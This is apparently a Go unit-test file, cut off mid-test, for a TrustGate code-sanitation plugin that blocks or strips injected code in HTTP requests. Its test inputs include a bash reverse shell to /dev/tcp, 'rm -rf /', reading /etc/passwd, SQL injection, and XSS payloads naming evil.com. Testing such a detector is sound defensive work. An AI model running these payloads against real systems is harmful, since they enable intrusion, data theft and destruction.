package code_sanitation_test

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/url"
	"testing"

	"github.com/NeuralTrust/TrustGate/pkg/infra/metrics"
	"github.com/NeuralTrust/TrustGate/pkg/infra/plugins/code_sanitation"
	plugintypes "github.com/NeuralTrust/TrustGate/pkg/infra/plugins/types"
	"github.com/NeuralTrust/TrustGate/pkg/types"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func newPlugin() *code_sanitation.CodeSanitationPlugin {
	logger := logrus.New()
	logger.SetLevel(logrus.DebugLevel)
	return code_sanitation.NewCodeSanitationPlugin(logger).(*code_sanitation.CodeSanitationPlugin)
}

// ============================================================================
// ValidateConfig Tests
// ============================================================================

func TestCodeSanitationPlugin_ValidateConfig_Valid(t *testing.T) {
	plugin := newPlugin()

	tests := []struct {
		name   string
		config plugintypes.PluginConfig
	}{
		{
			name: "block action with all languages",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"mode":              "enforce",
					"status_code":         400,
				},
			},
		},
		{
			name: "sanitize action",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body", "headers"},
					"mode":              "sanitize",
				},
			},
		},
		{
			name: "specific languages",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"languages": []interface{}{
						map[string]interface{}{"language": "javascript", "enabled": true},
						map[string]interface{}{"language": "sql", "enabled": true},
					},
					"content_to_check": []interface{}{"body"},
					"mode":           "enforce",
					"status_code":      403,
				},
			},
		},
		{
			name: "with custom patterns",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"all"},
					"mode":              "enforce",
					"status_code":         400,
					"custom_patterns": []interface{}{
						map[string]interface{}{
							"name":        "custom_test",
							"pattern":     `\btest_pattern\b`,
							"description": "Test pattern",
						},
					},
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := plugin.ValidateConfig(tt.config)
			assert.NoError(t, err)
		})
	}
}

func TestCodeSanitationPlugin_ValidateConfig_Invalid(t *testing.T) {
	plugin := newPlugin()

	tests := []struct {
		name        string
		config      plugintypes.PluginConfig
		expectedErr string
	}{
		{
			name: "missing content_to_check",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"mode":              "enforce",
				},
			},
			expectedErr: "at least one content type must be specified",
		},
		{
			name: "invalid content type",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"invalid_type"},
					"mode":              "enforce",
				},
			},
			expectedErr: "invalid content type",
		},
		{
			name: "invalid action",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"mode":              "invalid_action",
				},
			},
			expectedErr: "option must be one of",
		},
		{
			name: "invalid status code",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"mode":              "enforce",
					"status_code":         99, // Invalid: < 100
				},
			},
			expectedErr: "invalid status code",
		},
		{
			name: "invalid custom pattern regex",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"mode":              "enforce",
					"status_code":         400,
					"custom_patterns": []interface{}{
						map[string]interface{}{
							"name":    "invalid_regex",
							"pattern": `[invalid`,
						},
					},
				},
			},
			expectedErr: "invalid regex pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := plugin.ValidateConfig(tt.config)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), tt.expectedErr)
		})
	}
}

// ============================================================================
// Execute Tests - JavaScript
// ============================================================================

func TestCodeSanitationPlugin_Execute_JavaScript_Eval(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "eval('alert(1)')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.Equal(t, "alert(1)", result["content"])
	assert.NotContains(t, result["content"], "eval")
}

func TestCodeSanitationPlugin_Execute_JavaScript_ScriptTag(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "<script>alert('xss')</script>"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Verify sanitization
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["content"], "<script")
}

// ============================================================================
// Execute Tests - Python
// ============================================================================

func TestCodeSanitationPlugin_Execute_Python_Exec(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "python", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "exec('import os')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "exec")
	assert.Equal(t, "import os", result["code"])
}

func TestCodeSanitationPlugin_Execute_Python_OsModule(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "python", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"input": "import os; os.system('rm -rf /')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["input"], "os.system")
	assert.Contains(t, result["input"], "import os")
}

// ============================================================================
// Execute Tests - SQL Injection
// ============================================================================

func TestCodeSanitationPlugin_Execute_SQL_Injection(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "sql", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "enforce",
			"status_code":      403,
			"error_message":    "SQL injection detected",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"query": "SELECT * FROM users WHERE id = 1 OR 1=1"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 403, pluginErr.StatusCode)
	assert.Equal(t, "SQL injection detected", pluginErr.Message)
}

func TestCodeSanitationPlugin_Execute_SQL_UnionSelect(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "sql", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"search": "' UNION SELECT username, password FROM users--"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["search"], "UNION SELECT")
}

// ============================================================================
// Execute Tests - Shell Commands
// ============================================================================

func TestCodeSanitationPlugin_Execute_Shell_Command(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "shell", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "enforce",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"cmd": "cat /etc/passwd"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 400, pluginErr.StatusCode)
}

func TestCodeSanitationPlugin_Execute_Shell_ReverseShell(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "shell", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "enforce",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"payload": "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)
}

// ============================================================================
// Execute Tests - PHP
// ============================================================================

func TestCodeSanitationPlugin_Execute_PHP_ShellExec(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "php", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "shell_exec('whoami')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "shell_exec")
	assert.Equal(t, "whoami", result["code"])
}

// ============================================================================
// Execute Tests - Block vs Sanitize
// ============================================================================

func TestCodeSanitationPlugin_Execute_BlockMode(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "enforce",
			"status_code":         403,
			"error_message":       "Code injection blocked",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "eval('malicious')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 403, pluginErr.StatusCode)
	assert.Equal(t, "Code injection blocked", pluginErr.Message)
}

func TestCodeSanitationPlugin_Execute_SanitizeMode(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "sanitize",
		},
	}

	originalBody := `{"content": "eval('malicious')"}`
	req := &types.RequestContext{
		Body: []byte(originalBody),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err) // No error in sanitize mode
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// Body should be modified
	assert.NotEqual(t, originalBody, string(req.Body))
}

// ============================================================================
// Execute Tests - Headers
// ============================================================================

func TestCodeSanitationPlugin_Execute_Headers(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"headers"},
			"mode":           "sanitize",
		},
	}

	headers := make(map[string][]string)
	headers["X-Custom"] = []string{"eval('test')"}
	headers["User-Agent"] = []string{"Mozilla/5.0"}

	req := &types.RequestContext{
		Headers: headers,
		Body:    []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Header should be sanitized
	if vals, ok := req.Headers["X-Custom"]; ok && len(vals) > 0 {
		assert.NotContains(t, vals[0], "eval")
	}
	// Safe header unchanged
	if vals, ok := req.Headers["User-Agent"]; ok && len(vals) > 0 {
		assert.Equal(t, "Mozilla/5.0", vals[0])
	}
}

// ============================================================================
// Execute Tests - Path and Query
// ============================================================================

func TestCodeSanitationPlugin_Execute_QueryParams(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "sql", "enabled": true},
			},
			"content_to_check": []interface{}{"path_and_query"},
			"mode":           "sanitize",
		},
	}

	query := url.Values{}
	query.Set("id", "1 OR 1=1")
	query.Set("name", "john")

	req := &types.RequestContext{
		Path:  "/api/users",
		Query: query,
		Body:  []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Safe query unchanged
	assert.Equal(t, "john", req.Query.Get("name"))
}

func TestCodeSanitationPlugin_Execute_Path(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "shell", "enabled": true},
			},
			"content_to_check": []interface{}{"path_and_query"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Path: "/api/cat /etc/passwd",
		Body: []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Path should be sanitized
	assert.NotContains(t, req.Path, "cat /etc/passwd")
}

// ============================================================================
// Execute Tests - Safe Content
// ============================================================================

func TestCodeSanitationPlugin_Execute_SafeContent(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "enforce",
			"status_code":         400,
		},
	}

	safeBody := `{"message": "Hello, how are you today?", "count": 42}`
	req := &types.RequestContext{
		Body: []byte(safeBody),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// Body unchanged
	assert.Equal(t, safeBody, string(req.Body))
}

// ============================================================================
// Execute Tests - Multiple Languages Detection
// ============================================================================

func TestCodeSanitationPlugin_Execute_MultipleLanguages(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "sanitize",
		},
	}

	// eval exists in multiple languages (JS, Python, PHP, Ruby)
	req := &types.RequestContext{
		Body: []byte(`{"code": "eval('test')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// eval should be sanitized
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "eval")
}

// ============================================================================
// Execute Tests - Custom Patterns
// ============================================================================

func TestCodeSanitationPlugin_Execute_CustomPattern(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	// Custom patterns work in headers
	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"content_to_check": []interface{}{"headers"},
			"mode":           "sanitize",
			"custom_patterns": []interface{}{
				map[string]interface{}{
					"name":         "custom_dangerous",
					"pattern":      `\bdangerous_[a-z]+\b`,
					"description":  "Detect custom dangerous pattern",
					"content_type": "headers",
				},
			},
		},
	}

	headers := make(map[string][]string)
	headers["X-Custom"] = []string{"dangerous_function('test')"}

	req := &types.RequestContext{
		Headers: headers,
		Body:    []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Header should be sanitized - custom pattern should match
	if vals, ok := req.Headers["X-Custom"]; ok && len(vals) > 0 {
		assert.NotContains(t, vals[0], "dangerous_function")
	}
}

// ============================================================================
// Execute Tests - All Content Types
// ============================================================================

func TestCodeSanitationPlugin_Execute_AllContentTypes(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"all"},
			"mode":           "sanitize",
		},
	}

	headers := make(map[string][]string)
	headers["X-Eval"] = []string{"eval('header')"}

	query := url.Values{}
	query.Set("cmd", "eval('query')")

	req := &types.RequestContext{
		Headers: headers,
		Path:    "/api/test",
		Query:   query,
		Body:    []byte(`{"code": "eval('body')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Body should be sanitized
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "eval")

	// Header should be sanitized
	if vals, ok := req.Headers["X-Eval"]; ok && len(vals) > 0 {
		assert.NotContains(t, vals[0], "eval")
	}
}

// ============================================================================
// Execute Tests - Plain Text Body
// ============================================================================

func TestCodeSanitationPlugin_Execute_PlainTextBody(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`eval('plain text injection')`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	assert.NotContains(t, string(req.Body), "eval")
	assert.Equal(t, "plain text injection", string(req.Body))
}

// ============================================================================
// Execute Tests - Empty Body
// ============================================================================

func TestCodeSanitationPlugin_Execute_EmptyBody(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "enforce",
			"status_code":         400,
		},
	}

	req := &types.RequestContext{
		Body: []byte{},
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)
}

// ============================================================================
// Execute Tests - Nested JSON
// ============================================================================

func TestCodeSanitationPlugin_Execute_NestedJSON(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	nestedJSON := `{
		"level1": {
			"level2": {
				"code": "eval('nested')"
			}
		},
		"array": [
			{"item": "eval('in array')"},
			"safe string"
		]
	}`

	req := &types.RequestContext{
		Body: []byte(nestedJSON),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Verify nested content is sanitized
	assert.NotContains(t, string(req.Body), "eval")
}

// ============================================================================
// Plugin Metadata Tests
// ============================================================================

func TestCodeSanitationPlugin_Name(t *testing.T) {
	plugin := newPlugin()
	assert.Equal(t, "code_sanitation", plugin.Name())
}

func TestCodeSanitationPlugin_AllowedStages(t *testing.T) {
	plugin := newPlugin()
	stages := plugin.AllowedStages()
	assert.Len(t, stages, 1)
	assert.Equal(t, plugintypes.PreRequest, stages[0])
}

func TestCodeSanitationPlugin_RequiredPlugins(t *testing.T) {
	plugin := newPlugin()
	assert.Empty(t, plugin.RequiredPlugins())
}

// ============================================================================
// Execute Tests - HTML Injection
// ============================================================================

func TestCodeSanitationPlugin_Execute_HTML_Injection(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "html", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "<iframe src='http://evil.com'></iframe>"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["content"], "<iframe")
}

func TestCodeSanitationPlugin_Execute_HTML_Injection_ApplyAllLanguages(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "<iframe src='http://evil.com'></iframe>"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["content"], "<iframe", "iframe should be sanitized when apply_all_languages is true")
}

// ============================================================================
// Execute Tests - Java Code
// ============================================================================

func TestCodeSanitationPlugin_Execute_Java_Runtime(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "java", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "enforce",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "Runtime.getRuntime().exec('calc')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 400, pluginErr.StatusCode)
}

// ============================================================================
// Execute Tests - Ruby Code
// ============================================================================

func TestCodeSanitationPlugin_Execute_Ruby_Eval(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "ruby", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "eval('ls -la')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "eval")
	assert.Equal(t, "ls -la", result["code"])
}

// ============================================================================
// Execute Tests - CSharp Code
// ============================================================================

func TestCodeSanitationPlugin_Execute_CSharp_Process(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "csharp", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "enforce",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "System.Diagnostics.Process.Start('cmd.exe')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 400, pluginErr.StatusCode)
}

// ============================================================================
// Execute Tests - False Positive Prevention
// ============================================================================

func TestCodeSanitationPlugin_Execute_MarkdownLinks_NoFalsePositive(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	// Test with HTML language enabled (which was causing the false positive)
	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "enforce",
			"status_code":         400,
		},
	}

	tests := []struct {
		name string
		body string
	}{
		{
			name: "simple markdown link",
			body: `{"message": "Check out [inversiones](https://example.com/inversiones)"}`,
		},
		{
			name: "multiple markdown links",
			body: `{"message": "See [docs](https://docs.com) and [help](https://help.com)"}`,
		},
		{
			name: "markdown link with text in brackets",
			body: `{"message": "[Click here](https://example.com) for more info"}`,
		},
		{
			name: "plain text with brackets",
			body: `{"message": "The options are [option1] or [option2]"}`,
		},
		{
			name: "array notation should not trigger",
			body: `{"items": ["item1", "item2"], "note": "Select from [available options]"}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := &types.RequestContext{
				Body: []byte(tt.body),
			}
			res := &types.ResponseContext{}
			evtCtx := metrics.NewEventContext("", "", nil)

			resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

			// Should NOT detect as injection (no error, successful response)
			assert.NoError(t, err)
			assert.NotNil(t, resp)
			assert.Equal(t, http.StatusOK, resp.StatusCode)
		})
	}
}

func TestCodeSanitationPlugin_Execute_CSS_AttributeSelector_Detection(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "html", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"mode":           "enforce",
			"status_code":      400,
		},
	}

	// These SHOULD be detected as malicious event handler injections
	tests := []struct {
		name string
		body string
	}{
		{
			name: "onclick attribute selector",
			body: `{"message": "div[onclick=alert(1)]"}`,
		},
		{
			name: "onmouseover event handler",
			body: `{"message": "img onmouseover=alert(1)"}`,
		},
		{
			name: "onload attribute selector",
			body: `{"message": "img[onload=evil()]"}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := &types.RequestContext{
				Body: []byte(tt.body),
			}
			res := &types.ResponseContext{}
			evtCtx := metrics.NewEventContext("", "", nil)

			resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

			// SHOULD detect as injection (error expected)
			assert.Error(t, err)
			assert.Nil(t, resp)
		})
	}
}

// ============================================================================
// False Positive Prevention — common words/phrases must NOT trigger detection
// ============================================================================

func TestCodeSanitationPlugin_NoFalsePositives(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "enforce",
			"status_code":         400,
		},
	}

	tests := []struct {
		name string
		body string
	}{
